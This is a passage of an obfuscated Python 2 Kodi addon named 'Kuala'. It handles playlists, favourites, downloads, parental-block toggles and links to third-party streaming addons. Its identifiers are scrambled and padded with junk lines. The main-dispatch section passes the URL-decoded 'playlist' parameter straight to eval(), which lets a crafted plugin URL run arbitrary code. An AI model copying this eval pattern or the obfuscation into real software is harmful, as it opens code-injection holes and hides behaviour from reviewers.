    elif Ii1i1 [ 'quality' ] == 'SD' :
     OOOoOO0o = Ii1i1 [ 'url' ]
    elif Ii1i1 [ 'quality' ] == '1080p' and OOo . getSetting ( '1080pquality' ) == 'true' :
     OOOoOO0o = Ii1i1 [ 'url' ]
     break
  else :
   OOOoOO0o = O00oOo0O0o00O
 else :
  xbmc . executebuiltin ( "XBMC.Notification(Kuala,Urlresolver donot support this domain. - ,5000)" )
 return OOOoOO0o
def OOO000000OOO0 ( name , mu_playlist , queueVideo = None ) :
 O0OoooO0 = xbmc . PlayList ( xbmc . PLAYLIST_VIDEO )
 if 74 - 74: OOO0O0O0ooooo . OoOO0ooOOoo0O - oO0o0ooO0
 if OOo . getSetting ( 'ask_playlist_items' ) == 'true' and not queueVideo :
  import urlparse
  iiiiI1111 = [ ]
  for OOO00 in mu_playlist :
   OO0o0 = urlparse . urlparse ( OOO00 ) . netloc
   if OO0o0 == '' :
    iiiiI1111 . append ( name )
   else :
    iiiiI1111 . append ( OO0o0 )
  o0 = xbmcgui . Dialog ( )
  i11iIIIIIi1 = o0 . select ( 'Choose a video source' , iiiiI1111 )
  if i11iIIIIIi1 >= 0 :
   if "&mode=19" in mu_playlist [ i11iIIIIIi1 ] :
    if 83 - 83: Ooo00oOo00o / O0oO / O0oO * o0oO0 / o0oO0
    xbmc . Player ( ) . play ( oOOO0 ( mu_playlist [ i11iIIIIIi1 ] . replace ( '&mode=19' , '' ) . replace ( ';' , '' ) ) )
   elif "$doregex" in mu_playlist [ i11iIIIIIi1 ] :
    print mu_playlist [ i11iIIIIIi1 ]
    O0o0oOOooO0o = mu_playlist [ i11iIIIIIi1 ] . split ( '&regexs=' )
    print O0o0oOOooO0o
    oo0oOo , oOoOO = iiI11i1II ( O0o0oOOooO0o [ 1 ] , O0o0oOOooO0o [ 0 ] )
    oO0o0o00oOo0O = oo0oOo . replace ( ';' , '' )
    xbmc . Player ( ) . play ( oO0o0o00oOo0O )
    if 100 - 100: Ooo00oOo00o % Ooo00oOo00o
   else :
    oo0oOo = mu_playlist [ i11iIIIIIi1 ]
    xbmc . Player ( ) . play ( oo0oOo )
 elif not queueVideo :
  if 15 - 15: OoOO0ooOOoo0O / o0oO0
  O0OoooO0 . clear ( )
  O0O0Oooo0o = 0
  for OOO00 in mu_playlist :
   O0O0Oooo0o += 1
   O0o0Oo = xbmcgui . ListItem ( '%s) %s' % ( str ( O0O0Oooo0o ) , name ) )
   if 37 - 37: i11iIiiIii + IIiIiII11i . o0000oOoOoO0o % o00O0oo % o00O0oo
   try :
    if "$doregex" in OOO00 :
     O0o0oOOooO0o = OOO00 . split ( '&regexs=' )
     print O0o0oOOooO0o
     oo0oOo , oOoOO = iiI11i1II ( O0o0oOOooO0o [ 1 ] , O0o0oOOooO0o [ 0 ] )
    elif "&mode=19" in OOO00 :
     oo0oOo = oOOO0 ( OOO00 . replace ( '&mode=19' , '' ) . replace ( ';' , '' ) )
    if oo0oOo :
     O0OoooO0 . add ( oo0oOo , O0o0Oo )
    else :
     raise
   except Exception :
    O0OoooO0 . add ( OOO00 , O0o0Oo )
    pass
    if 26 - 26: OOO0O0O0ooooo
  xbmc . executebuiltin ( 'playlist.playoffset(video,0)' )
 else :
  if 34 - 34: i11Ii11I1Ii1i * o0oO0
  I1i = xbmcgui . ListItem ( name )
  O0OoooO0 . add ( mu_playlist , I1i )
  if 97 - 97: i11iIiiIii % OoOO0ooOOoo0O / IiIIi1I1Iiii / IiIIi1I1Iiii
  if 97 - 97: iIiiiI1IiI1I1 - o0oO0 - IIii1I * IIiIiII11i
def oooO0o0O0oo0o ( name , url ) :
 if OOo . getSetting ( 'save_location' ) == "" :
  xbmc . executebuiltin ( "XBMC.Notification('Kuala','Choose a location to save files.',15000," + oO0o0o0ooO0oO + ")" )
  OOo . openSettings ( )
 III1II1i = { 'url' : url , 'download_path' : OOo . getSetting ( 'save_location' ) }
 downloader . download ( name , III1II1i )
 o0 = xbmcgui . Dialog ( )
 i1IiII1III = o0 . yesno ( 'Kuala' , 'Do you want to add this file as a source?' )
 if i1IiII1III :
  Ii1i11IIii1I ( os . path . join ( OOo . getSetting ( 'save_location' ) , name ) )
  if 100 - 100: O0oO . oO0o0ooO0 - IIii1I . i11iIiiIii / iIiiiI1IiI1I1
def o0oO0OO00oo0o ( url , name ) :
 if 17 - 17: O0oO / OoOO - ii11ii1ii * OoOO
 i11i11II11i = [ 'Kuala' , 'plugin://plugin.video.phstreams' , 'plugin://plugin.video.SportsDevil' , 'plugin://plugin.video.CanTVLive' , 'plugin://plugin.video.ccloudtv' , 'plugin://plugin.video.prosport' , 'plugin://plugin.video.p2psport' , ]
 if 9 - 9: OOooOOo - OoOO * i11Ii11I1Ii1i . i11Ii11I1Ii1i - IIiIiII11i
 if 74 - 74: OoOO * i11iIiiIii / IIiIiII11i - OOO0O0O0ooooo . i11Ii11I1Ii1i
 if 39 - 39: i11Ii11I1Ii1i / OOO0O0O0ooooo * O0oO
 if 17 - 17: oO0o0ooO0 / IIii1I - Ooo00oOo00o + IIiIiII11i % o0000oOoOoO0o
 if 14 - 14: ii11ii1ii % O0oO + OoOO + Ooo00oOo00o
 if 76 - 76: Ooo00oOo00o - i11iIiiIii + OOooOOo + o0000oOoOoO0o / II1
 if 50 - 50: iIiiiI1IiI1I1 - o0oO0 + IIii1I + IIii1I
 iiiiI1111 = [ 'Kuala' , 'Phoenix' , 'SportsDevil' , 'CanTVLive' , 'Ccloudtv' , 'Prosport' , 'P2psport' ]
 if 91 - 91: iIiiiI1IiI1I1 - OOO0O0O0ooooo . IIii1I . OOO0O0O0ooooo + OoOO - iIiiiI1IiI1I1
 o0 = xbmcgui . Dialog ( )
 i11iIIIIIi1 = o0 . select ( 'Choose a video source' , iiiiI1111 )
 if 26 - 26: ii11ii1ii
 if i11iIIIIIi1 >= 0 :
  url = i11i11II11i [ i11iIIIIIi1 ]
  print 'url' , url
  IiIi ( url )
  if 88 - 88: OOooOOo - o0000oOoOoO0o
def IiIiiI ( name , url , mode , iconimage , fanart , description , genre , date , credits , showcontext = False , regexs = None , reg_url = None , allinfo = { } ) :
 if 63 - 63: O0oO * II1
 I1iIiiiI1 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&fanart=" + urllib . quote_plus ( fanart )
 I11II1i = True
 if date == '' :
  date = None
 else :
  description += '\n\nDate: %s' % date
 OOO0O00Oo = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if len ( allinfo ) < 1 :
  OOO0O00Oo . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description , "Genre" : genre , "dateadded" : date , "credits" : credits } )
 else :
  OOO0O00Oo . setInfo ( type = "Video" , infoLabels = allinfo )
 OOO0O00Oo . setProperty ( "Fanart_Image" , fanart )
 if showcontext :
  ii1 = [ ]
  o0Oo00 = OOo . getSetting ( 'parentalblocked' )
  o0Oo00 = o0Oo00 == "true"
  oOOO0ooOO = OOo . getSetting ( 'parentalblockedpin' )
  if 3 - 3: II1
  if len ( oOOO0ooOO ) > 0 :
   if o0Oo00 :
    ii1 . append ( ( 'Disable Parental Block' , 'XBMC.RunPlugin(%s?mode=55&name=%s)' % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
   else :
    ii1 . append ( ( 'Enable Parental Block' , 'XBMC.RunPlugin(%s?mode=56&name=%s)' % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
    if 71 - 71: O0oO + O00ooooo00 - IIII - i11iIiiIii . o00O0oo - i11Ii11I1Ii1i
  if showcontext == 'source' :
   if 85 - 85: OoOO - OOooOOo / OoOO + o0000oOoOoO0o - IIII
   if name in str ( ii11iIi1I ) :
    ii1 . append ( ( 'Remove from Sources' , 'XBMC.RunPlugin(%s?mode=8&name=%s)' % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
    if 49 - 49: Ooo00oOo00o - OOO0O0O0ooooo / Ooo00oOo00o * OOooOOo + o0oO0
    if 35 - 35: iIiiiI1IiI1I1 . IIiIiII11i / O00ooooo00 / IIiIiII11i * OoOO0ooOOoo0O
  elif showcontext == 'download' :
   ii1 . append ( ( 'Download' , 'XBMC.RunPlugin(%s?url=%s&mode=9&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( url ) , urllib . quote_plus ( name ) ) ) )
  elif showcontext == 'fav' :
   ii1 . append ( ( 'Remove from Kuala Favorites' , 'XBMC.RunPlugin(%s?mode=6&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  if showcontext == '!!update' :
   Oo0O0000Oo00o = (
 '%s?url=%s&mode=17&regexs=%s'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( reg_url ) , regexs )
 )
   ii1 . append ( ( '[COLOR yellow]!!update[/COLOR]' , 'XBMC.RunPlugin(%s)' % Oo0O0000Oo00o ) )
  if not name in i1iIIi1 :
   ii1 . append ( ( 'Add to Kuala Favorites' , 'XBMC.RunPlugin(%s?mode=5&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , urllib . quote_plus ( fanart ) , mode ) ) )
  OOO0O00Oo . addContextMenuItems ( ii1 )
 I11II1i = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = I1iIiiiI1 , listitem = OOO0O00Oo , isFolder = True )
 return I11II1i
def II1ii ( url , title , media_type = 'video' ) :
 if 89 - 89: IIII . i11iIiiIii * OOO0O0O0ooooo
 if 44 - 44: O00ooooo00 . IIiIiII11i / i11iIiiIii + O0oO
 import youtubedl
 if not url == '' :
  if media_type == 'audio' :
   youtubedl . single_YD ( url , download = True , audio = True )
  else :
   youtubedl . single_YD ( url , download = True )
 elif xbmc . Player ( ) . isPlaying ( ) == True :
  import YDStreamExtractor
  if YDStreamExtractor . isDownloading ( ) == True :
   if 27 - 27: o0000oOoOoO0o
   YDStreamExtractor . manageDownloads ( )
  else :
   O0OO0ooO00 = xbmc . Player ( ) . getPlayingFile ( )
   if 83 - 83: IIii1I
   O0OO0ooO00 = O0OO0ooO00 . split ( '|User-Agent=' ) [ 0 ]
   O0o0Oo = { 'url' : O0OO0ooO00 , 'title' : title , 'media_type' : media_type }
   youtubedl . single_YD ( '' , download = True , dl_info = O0o0Oo )
 else :
  xbmc . executebuiltin ( "XBMC.Notification(DOWNLOAD,First Play [COLOR yellow]WHILE playing download[/COLOR] ,10000)" )
  if 63 - 63: II1 * Ooo00oOo00o / o00O0oo - OoOO0ooOOoo0O . IIii1I + IIII
  if 44 - 44: O00ooooo00 % IIiIiII11i % ii11ii1ii
def iIIi1Ii1III ( string ) :
 if isinstance ( string , basestring ) :
  if isinstance ( string , unicode ) :
   string = string . encode ( 'ascii' , 'ignore' )
 return string
def Oooo00 ( string , encoding = 'utf-8' ) :
 if isinstance ( string , basestring ) :
  if not isinstance ( string , unicode ) :
   string = unicode ( string , encoding , 'ignore' )
 return string
def iii1II1iI1IIi ( s ) : return "" . join ( filter ( lambda Ii11iiI1 : ord ( Ii11iiI1 ) < 128 , s ) )
if 71 - 71: ii11ii1ii / o0000oOoOoO0o % o0000oOoOoO0o
def OoooO0 ( command ) :
 ooOoo0O = ''
 try :
  ooOoo0O = xbmc . executeJSONRPC ( Oooo00 ( command ) )
 except UnicodeEncodeError :
  ooOoo0O = xbmc . executeJSONRPC ( iIIi1Ii1III ( command ) )
  if 75 - 75: i11Ii11I1Ii1i
 return Oooo00 ( ooOoo0O )
 if 29 - 29: OoOO
def IiIi ( url , give_me_result = None , playlist = False ) :
 if 'audio' in url :
  Oo0o00ooOOOoOo = Oooo00 ( '{"jsonrpc":"2.0","method":"Files.GetDirectory","params": {"directory":"%s","media":"video", "properties": ["title", "album", "artist", "duration","thumbnail", "year"]}, "id": 1}' ) % url
 else :
  Oo0o00ooOOOoOo = Oooo00 ( '{"jsonrpc":"2.0","method":"Files.GetDirectory","params":{"directory":"%s","media":"video","properties":[ "plot","playcount","director", "genre","votes","duration","trailer","premiered","thumbnail","title","year","dateadded","fanart","rating","season","episode","studio","mpaa"]},"id":1}' ) % url
 I111I1I = json . loads ( OoooO0 ( Oo0o00ooOOOoOo ) )
 if 54 - 54: iIiiiI1IiI1I1 + o00O0oo % o00O0oo % ii11ii1ii
 if give_me_result :
  return I111I1I
 if I111I1I . has_key ( 'error' ) :
  return
 else :
  if 25 - 25: IIII - IiIIi1I1Iiii
  for OOO00 in I111I1I [ 'result' ] [ 'files' ] :
   Iii1IIIIIII = { }
   url = OOO00 [ 'file' ]
   IiI1 = iii1II1iI1IIi ( OOO00 [ 'label' ] )
   OOOOoOoo0O0O0 = iii1II1iI1IIi ( OOO00 [ 'thumbnail' ] )
   OOO0OOO00oo = iii1II1iI1IIi ( OOO00 [ 'fanart' ] )
   Iii1IIIIIII = dict ( ( k , v ) for k , v in OOO00 . iteritems ( ) if not v == '0' or not v == - 1 or v == '' )
   Iii1IIIIIII . pop ( "file" , None )
   if OOO00 [ 'filetype' ] == 'file' :
    if playlist :
     OOO000000OOO0 ( IiI1 , url , queueVideo = '1' )
     continue
    else :
     iiOOooooO0Oo ( url , IiI1 , OOOOoOoo0O0O0 , OOO0OOO00oo , '' , '' , '' , '' , None , '' , total = len ( I111I1I [ 'result' ] [ 'files' ] ) , allinfo = Iii1IIIIIII )
     if 27 - 27: Ooo00oOo00o + OOooOOo * i11Ii11I1Ii1i
     if OOO00 [ 'type' ] and OOO00 [ 'type' ] == 'tvshow' :
      xbmcplugin . setContent ( int ( sys . argv [ 1 ] ) , 'tvshows' )
     elif OOO00 [ 'episode' ] > 0 :
      xbmcplugin . setContent ( int ( sys . argv [ 1 ] ) , 'episodes' )
      if 83 - 83: IIii1I
   else :
    IiIiiI ( IiI1 , url , 53 , OOOOoOoo0O0O0 , OOO0OOO00oo , '' , '' , '' , '' , allinfo = Iii1IIIIIII )
  xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
  if 72 - 72: o00O0oo
def iiOOooooO0Oo ( url , name , iconimage , fanart , description , genre , date , showcontext , playlist , regexs , total , setCookie = "" , allinfo = { } ) :
 if 87 - 87: O00ooooo00
 ii1 = [ ]
 o0Oo00 = OOo . getSetting ( 'parentalblocked' )
 o0Oo00 = o0Oo00 == "true"
 oOOO0ooOO = OOo . getSetting ( 'parentalblockedpin' )
 if 48 - 48: IiIIi1I1Iiii * OoOO0ooOOoo0O * IIii1I + i11iIiiIii - II1
 if len ( oOOO0ooOO ) > 0 :
  if o0Oo00 :
   ii1 . append ( ( 'Disable Parental Block' , 'XBMC.RunPlugin(%s?mode=55&name=%s)' % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  else :
   ii1 . append ( ( 'Enable Parental Block' , 'XBMC.RunPlugin(%s?mode=56&name=%s)' % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
   if 38 - 38: OOooOOo / IIii1I % i11iIiiIii - O0oO * IIII / OOooOOo
 try :
  name = name . encode ( 'utf-8' )
 except : pass
 if 13 - 13: Ooo00oOo00o * OoOO - o0oO0
 if 79 - 79: OoOO0ooOOoo0O % ii11ii1ii % OOooOOo
 if 45 - 45: IIiIiII11i * o0000oOoOoO0o % Ooo00oOo00o
 if 24 - 24: i11Ii11I1Ii1i - o00O0oo * OoOO0ooOOoo0O
 if 87 - 87: oO0o0ooO0 - OoOO % OoOO . OoOO0ooOOoo0O / OoOO
 if 6 - 6: OOooOOo / IIii1I * II1 * i11iIiiIii
 I11II1i = True
 o0O0OOo0oO = False
 if regexs :
  Iiiii = '17'
  if 'listrepeat' in regexs :
   o0O0OOo0oO = True
   print 'setting as folder in link'
  ii1 . append ( ( '[COLOR white]!!Download Currently Playing!![/COLOR]' , 'XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( url ) , urllib . quote_plus ( name ) ) ) )
 elif ( any ( x in url for x in OO0o ) and url . startswith ( 'http' ) ) or url . endswith ( '&mode=19' ) :
  url = url . replace ( '&mode=19' , '' )
  Iiiii = '19'
  ii1 . append ( ( '[COLOR white]!!Download Currently Playing!![/COLOR]' , 'XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( url ) , urllib . quote_plus ( name ) ) ) )
 elif url . endswith ( '&mode=18' ) :
  url = url . replace ( '&mode=18' , '' )
  Iiiii = '18'
  ii1 . append ( ( '[COLOR white]!!Download!![/COLOR]' , 'XBMC.RunPlugin(%s?url=%s&mode=23&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( url ) , urllib . quote_plus ( name ) ) ) )
  if OOo . getSetting ( 'dlaudioonly' ) == 'true' :
   ii1 . append ( ( '!!Download [COLOR seablue]Audio!![/COLOR]' , 'XBMC.RunPlugin(%s?url=%s&mode=24&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( url ) , urllib . quote_plus ( name ) ) ) )
 elif url . startswith ( 'magnet:?xt=' ) :
  if '&' in url and not '&amp;' in url :
   url = url . replace ( '&' , '&amp;' )
  url = 'plugin://plugin.video.pulsar/play?uri=' + url
  Iiiii = '12'
 else :
  Iiiii = '12'
  ii1 . append ( ( '[COLOR white]!!Download Currently Playing!![/COLOR]' , 'XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( url ) , urllib . quote_plus ( name ) ) ) )
 if 'plugin://plugin.video.youtube/play/?video_id=' in url :
  iiI = url . replace ( 'plugin://plugin.video.youtube/play/?video_id=' , 'https://www.youtube.com/watch?v=' )
  ii1 . append ( ( '!!Download [COLOR blue]Audio!![/COLOR]' , 'XBMC.RunPlugin(%s?url=%s&mode=24&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( iiI ) , urllib . quote_plus ( name ) ) ) )
 I1iIiiiI1 = sys . argv [ 0 ] + "?"
 IiiIi = False
 if playlist :
  if OOo . getSetting ( 'add_playlist' ) == "false" :
   I1iIiiiI1 += "url=" + urllib . quote_plus ( url ) + "&mode=" + Iiiii
  else :
   I1iIiiiI1 += "mode=13&name=%s&playlist=%s" % ( urllib . quote_plus ( name ) , urllib . quote_plus ( str ( playlist ) . replace ( ',' , '||' ) ) )
   name = name + '[COLOR green][/COLOR]'
   IiiIi = True
 else :
  I1iIiiiI1 += "url=" + urllib . quote_plus ( url ) + "&mode=" + Iiiii
 if regexs :
  I1iIiiiI1 += "&regexs=" + regexs
 if not setCookie == '' :
  I1iIiiiI1 += "&setCookie=" + urllib . quote_plus ( setCookie )
  if 42 - 42: IIII + IIii1I
 if date == '' :
  date = None
 else :
  description += '\n\nDate: %s' % date
 OOO0O00Oo = xbmcgui . ListItem ( name , iconImage = "DefaultVideo.png" , thumbnailImage = iconimage )
 if len ( allinfo ) < 1 :
  OOO0O00Oo . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description , "Genre" : genre , "dateadded" : date } )
  if 21 - 21: OOooOOo - IiIIi1I1Iiii % OOO0O0O0ooooo . Ooo00oOo00o + OOooOOo
 else :
  OOO0O00Oo . setInfo ( type = "Video" , infoLabels = allinfo )
 OOO0O00Oo . setProperty ( "Fanart_Image" , fanart )
 if 41 - 41: iIiiiI1IiI1I1 * i11Ii11I1Ii1i
 if ( not IiiIi ) and not any ( x in url for x in Oo0Ooo ) and not '$PLAYERPROXY$=' in url :
  if regexs :
   if 68 - 68: oO0o0ooO0 - IIiIiII11i
   if '$pyFunction:playmedia(' not in urllib . unquote_plus ( regexs ) and 'notplayable' not in urllib . unquote_plus ( regexs ) and 'listrepeat' not in urllib . unquote_plus ( regexs ) :
    if 41 - 41: OoOO0ooOOoo0O
    OOO0O00Oo . setProperty ( 'IsPlayable' , 'true' )
  else :
   OOO0O00Oo . setProperty ( 'IsPlayable' , 'true' )
 else :
  i1IIiiiii ( 'NOT setting isplayable' + url )
 if showcontext :
  if 21 - 21: i11Ii11I1Ii1i + ii11ii1ii % o0oO0 + i11iIiiIii + IIII + iIiiiI1IiI1I1
  if showcontext == 'fav' :
   ii1 . append (
 ( 'Remove from Kuala Favorites' , 'XBMC.RunPlugin(%s?mode=6&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) )
 )
  elif not name in i1iIIi1 :
   oOO0OOOOOo0Oo = (
 '%s?mode=5&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=0'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , urllib . quote_plus ( fanart ) )
 )
   if playlist :
    oOO0OOOOOo0Oo += 'playlist=' + urllib . quote_plus ( str ( playlist ) . replace ( ',' , '||' ) )
   if regexs :
    oOO0OOOOOo0Oo += "&regexs=" + regexs
   ii1 . append ( ( 'Add to Kuala Favorites' , 'XBMC.RunPlugin(%s)' % oOO0OOOOOo0Oo ) )
  OOO0O00Oo . addContextMenuItems ( ii1 )
 if not playlist is None :
  if OOo . getSetting ( 'add_playlist' ) == "false" :
   iIi = name . split ( ') ' ) [ 1 ]
   Ii1Ii1Ii1IIIi = [
 ( 'Play ' + iIi + ' PlayList' , 'XBMC.RunPlugin(%s?mode=13&name=%s&playlist=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( iIi ) , urllib . quote_plus ( str ( playlist ) . replace ( ',' , '||' ) ) ) )
 ]
   OOO0O00Oo . addContextMenuItems ( Ii1Ii1Ii1IIIi )
   if 70 - 70: OOooOOo . o0000oOoOoO0o * O0oO + o00O0oo
 I11II1i = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = I1iIiiiI1 , listitem = OOO0O00Oo , totalItems = total , isFolder = o0O0OOo0oO )
 if 77 - 77: OoOO0ooOOoo0O % i11iIiiIii . o0000oOoOoO0o % o0000oOoOoO0o
 if 36 - 36: IiIIi1I1Iiii % oO0o0ooO0 / i11iIiiIii % o0oO0 + Ooo00oOo00o
 return I11II1i
 if 23 - 23: iIiiiI1IiI1I1
 if 93 - 93: OoOO0ooOOoo0O . o00O0oo / O00ooooo00
def i11ii ( url , name , iconimage , setresolved = True ) :
 if setresolved :
  OOO0O00Oo = xbmcgui . ListItem ( name , iconImage = iconimage )
  OOO0O00Oo . setInfo ( type = 'Video' , infoLabels = { 'Title' : name } )
  OOO0O00Oo . setProperty ( "IsPlayable" , "true" )
  OOO0O00Oo . setPath ( url )
  xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , OOO0O00Oo )
 else :
  xbmc . executebuiltin ( 'XBMC.RunPlugin(' + url + ')' )
  if 83 - 83: OoOO * OoOO + o0000oOoOoO0o
  if 57 - 57: OOO0O0O0ooooo - OOO0O0O0ooooo . OoOO / ii11ii1ii / oO0o0ooO0
  if 20 - 20: o0000oOoOoO0o * iIiiiI1IiI1I1 - OOooOOo - OoOO0ooOOoo0O * o0oO0
  if 6 - 6: i11Ii11I1Ii1i + o0000oOoOoO0o / IiIIi1I1Iiii + O0oO % iIiiiI1IiI1I1 / Ooo00oOo00o
def iIIii ( link ) :
 oo0oOo = urllib . urlopen ( link )
 iiIiOooooOo = oo0oOo . read ( )
 oo0oOo . close ( )
 IIIiiiIiI = iiIiOooooOo . split ( "Jetzt" )
 OO0OOoooo0o = IIIiiiIiI [ 1 ] . split ( 'programm/detail.php?const_id=' )
 IiIi1Ii = OO0OOoooo0o [ 1 ] . split ( '<br /><a href="/' )
 iiIIiI11II1 = IiIi1Ii [ 0 ] [ 40 : len ( IiIi1Ii [ 0 ] ) ]
 oooOo = OO0OOoooo0o [ 2 ] . split ( "</a></p></div>" )
 oOoO0Oo0 = oooOo [ 0 ] [ 17 : len ( oooOo [ 0 ] ) ]
 oOoO0Oo0 = oOoO0Oo0 . encode ( 'utf-8' )
 return "  - " + oOoO0Oo0 + " - " + iiIIiI11II1
 if 7 - 7: i11Ii11I1Ii1i + oO0o0ooO0
 if 32 - 32: IIii1I % IIiIiII11i / i11iIiiIii + o0000oOoOoO0o - ii11ii1ii . IIII
def I1111i ( url , regex ) :
 ooOoo0O = OoO000 ( url )
 try :
  O0O0Oooo0o = re . findall ( regex , ooOoo0O ) [ 0 ]
  return O0O0Oooo0o
 except :
  i1IIiiiii ( 'regex failed' )
  i1IIiiiii ( regex )
  return
  if 86 - 86: O00ooooo00 / oO0o0ooO0 * IIiIiII11i
  if 67 - 67: OoOO * OoOO / OoOO0ooOOoo0O * II1 + OOooOOo
  if 79 - 79: O00ooooo00
def iIi1 ( d , root = "root" , nested = 0 ) :
 if 96 - 96: O00ooooo00 % II1
 oo = lambda iI1i : '<' + iI1i + '>'
 i11I = lambda iI1i : '</' + iI1i + '>\n'
 o0oO0o0oo0O0 = lambda Ii , O0oo00oOOO0o : O0oo00oOOO0o + oo ( II1i ) + str ( Ii ) + i11I ( II1i )
 if 6 - 6: O0oO * O0oO * OOO0O0O0ooooo / o0000oOoOoO0o + OOO0O0O0ooooo
 O0oo00oOOO0o = oo ( root ) + '\n' if root else ""
 if 51 - 51: ii11ii1ii - OOooOOo + IiIIi1I1Iiii / o00O0oo % OOooOOo
 for II1i , iIiii1Ii1I1II in d . iteritems ( ) :
  iIIIIII = type ( iIiii1Ii1I1II )
  if nested == 0 : II1i = 'regex'
  if iIIIIII is list :
   for Ii in iIiii1Ii1I1II :
    Ii = escape ( Ii )
    O0oo00oOOO0o = o0oO0o0oo0O0 ( Ii , O0oo00oOOO0o )
    if 41 - 41: IiIIi1I1Iiii / O00ooooo00 / IiIIi1I1Iiii - IIII . ii11ii1ii
  if iIIIIII is dict :
   O0oo00oOOO0o = o0oO0o0oo0O0 ( '\n' + iIi1 ( iIiii1Ii1I1II , None , nested + 1 ) , O0oo00oOOO0o )
  if iIIIIII is not list and iIIIIII is not dict :
   if not iIiii1Ii1I1II is None : iIiii1Ii1I1II = escape ( iIiii1Ii1I1II )
   O0oo00oOOO0o = o0oO0o0oo0O0 ( iIiii1Ii1I1II , O0oo00oOOO0o )
   if 65 - 65: OOO0O0O0ooooo * i11iIiiIii . II1 / IIiIiII11i / IIII
 O0oo00oOOO0o += i11I ( root ) if root else ""
 if 69 - 69: i11Ii11I1Ii1i % i11Ii11I1Ii1i
 return O0oo00oOOO0o
xbmcplugin . setContent ( int ( sys . argv [ 1 ] ) , 'movies' )
if 76 - 76: i11iIiiIii * IIII / Ooo00oOo00o % OoOO + o0000oOoOoO0o
try :
 xbmcplugin . addSortMethod ( int ( sys . argv [ 1 ] ) , xbmcplugin . SORT_METHOD_UNSORTED )
except :
 pass
try :
 xbmcplugin . addSortMethod ( int ( sys . argv [ 1 ] ) , xbmcplugin . SORT_METHOD_LABEL )
except :
 pass
try :
 xbmcplugin . addSortMethod ( int ( sys . argv [ 1 ] ) , xbmcplugin . SORT_METHOD_DATE )
except :
 pass
try :
 xbmcplugin . addSortMethod ( int ( sys . argv [ 1 ] ) , xbmcplugin . SORT_METHOD_GENRE )
except :
 pass
 if 48 - 48: IIii1I % O00ooooo00 + OOooOOo % ii11ii1ii
III1II1i = IiiII1iIii111iII ( )
if 79 - 79: OOooOOo % IIiIiII11i % oO0o0ooO0 / O00ooooo00 % Ooo00oOo00o
oo0oOo = None
IiI1 = None
Iiiii = None
O0OoooO0 = None
oOO0oo = None
OOO0OOO00oo = oo0o0O00
O0OoooO0 = None
oo0o00OO = None
iiIIiiIi1Ii11 = None
if 69 - 69: ii11ii1ii % i11iIiiIii / oO0o0ooO0
try :
 oo0oOo = urllib . unquote_plus ( III1II1i [ "url" ] ) . decode ( 'utf-8' )
except :
 pass
try :
 IiI1 = urllib . unquote_plus ( III1II1i [ "name" ] )
except :
 pass
try :
 oOO0oo = urllib . unquote_plus ( III1II1i [ "iconimage" ] )
except :
 pass
try :
 OOO0OOO00oo = urllib . unquote_plus ( III1II1i [ "fanart" ] )
except :
 pass
try :
 Iiiii = int ( III1II1i [ "mode" ] )
except :
 pass
try :
 O0OoooO0 = eval ( urllib . unquote_plus ( III1II1i [ "playlist" ] ) . replace ( '||' , ',' ) )
except :
 pass
try :
 oo0o00OO = int ( III1II1i [ "fav_mode" ] )
except :
 pass
try :
 iiIIiiIi1Ii11 = III1II1i [ "regexs" ]
except :
 pass
 if 93 - 93: i11Ii11I1Ii1i
i1IIiiiii ( "Mode: " + str ( Iiiii ) )
if 34 - 34: OoOO0ooOOoo0O - i11Ii11I1Ii1i * IiIIi1I1Iiii / ii11ii1ii
if 19 - 19: OoOO
if not oo0oOo is None :
 i1IIiiiii ( "URL: " + str ( oo0oOo . encode ( 'utf-8' ) ) )
i1IIiiiii ( "Name: " + str ( IiI1 ) )
if 46 - 46: IIii1I . i11iIiiIii - OOooOOo % OOO0O0O0ooooo / iIiiiI1IiI1I1 * O00ooooo00
if Iiiii == None :
 Ii11iI1i ( )
 i1IIiiiii ( "getSources" )
 i1 ( )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 66 - 66: OOO0O0O0ooooo
elif Iiiii == 1 :
 i1IIiiiii ( "getData" )
 ooOoo0O = None
 if iiIIiiIi1Ii11 :
  ooOoo0O = iiI11i1II ( iiIIiiIi1Ii11 , oo0oOo )
  oo0oOo = ''
  if 52 - 52: Ooo00oOo00o * II1
 i11Iiii ( oo0oOo , OOO0OOO00oo , ooOoo0O )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 12 - 12: OOO0O0O0ooooo + O0oO * O00ooooo00 . Ooo00oOo00o
